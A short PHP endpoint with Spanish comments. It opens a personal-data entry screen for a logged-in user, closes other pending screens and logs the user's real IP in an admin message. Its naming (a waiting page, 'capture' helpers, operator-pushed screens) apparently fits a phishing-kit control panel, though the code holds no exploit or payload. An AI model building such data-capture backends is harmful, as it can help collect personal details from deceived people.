<?php
/**
 * Abre la tela de datos de contacto para el usuario en sesión.
 * La usa el aviso de WhatsApp en synwait.php al pulsar Aceptar.
 */
error_reporting(E_ERROR | E_PARSE);
session_start();
header('Content-Type: application/json');

if (!isset($_SESSION['usuario_id'])) {
    echo json_encode(['success' => false, 'error' => 'No hay sesión activa']);
    exit;
}

try {
    require_once '../php_config/conexionbd.php';
    require_once __DIR__ . '/chat_captura_helper.php';
    require_once __DIR__ . '/cerrar_otras_telas.php';
    $pdo = conectarBD();

    $usuario_id = (int) $_SESSION['usuario_id'];

    $stmtUser = $pdo->prepare("SELECT id, ip_real FROM usuarios WHERE id = ?");
    $stmtUser->execute([$usuario_id]);
    $usuario = $stmtUser->fetch(PDO::FETCH_ASSOC);
    if (!$usuario) {
        echo json_encode(['success' => false, 'error' => 'El usuario no existe']);
        exit;
    }

    cerrarTelasPendientes($pdo, $usuario_id);

    $stmt = $pdo->prepare("
        INSERT INTO datos_personales_enviados (usuario_id, estado, fecha_envio)
        VALUES (?, 'pendiente', NOW())
    ");
    $stmt->execute([$usuario_id]);
    $datos_personales_id = (int) $pdo->lastInsertId();

    $ip = $usuario['ip_real'] ?: 'unknown';
    insertarMensajeAdmin($pdo, $usuario_id, $ip, 'Solicitud Datos Personales');

    echo json_encode([
        'success' => true,
        'datos_personales_id' => $datos_personales_id
    ]);
} catch (PDOException $e) {
    echo json_encode(['success' => false, 'error' => 'Error de base de datos: ' . $e->getMessage()]);
} catch (Exception $e) {
    echo json_encode(['success' => false, 'error' => 'Error: ' . $e->getMessage()]);
}
?>
